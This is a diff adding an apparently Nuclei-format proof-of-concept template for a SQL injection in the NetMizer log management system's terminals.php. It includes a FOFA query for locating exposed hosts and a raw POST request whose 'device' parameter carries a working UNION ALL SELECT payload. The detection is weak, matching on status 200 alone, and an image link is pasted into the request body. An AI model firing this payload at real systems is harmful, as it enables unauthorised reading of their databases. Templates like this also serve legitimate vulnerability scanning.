@@ -1,0 +1,42 @@
+id: poc-hsfbymsx7qqgifr9
+info:
+  name: NetMizer 日志管理系统terminals.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hsfbymsx7qqgifr9'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hsfbymsx7qqgifr9
+    fofa: title="NetMizer 日志管理系统"
+http:
+- raw:
+  - 'POST /data/echart/terminals.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
+
+    Accept: */*
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    Priority: u=0
+
+    Content-Length: 40
+
+
+    action=phonelist-pie&type=3&device=1 UNION ALL SELECT NULL,CONCAT(0x71716a7a71,0x4b486d79695241494a69717451667a6d67487761764e72775a7066514176484f5a47697455596141,0x71766a7171),NULL-- -
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748670775685-da7485c1-b859-444c-bc6a-15d64e719249.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
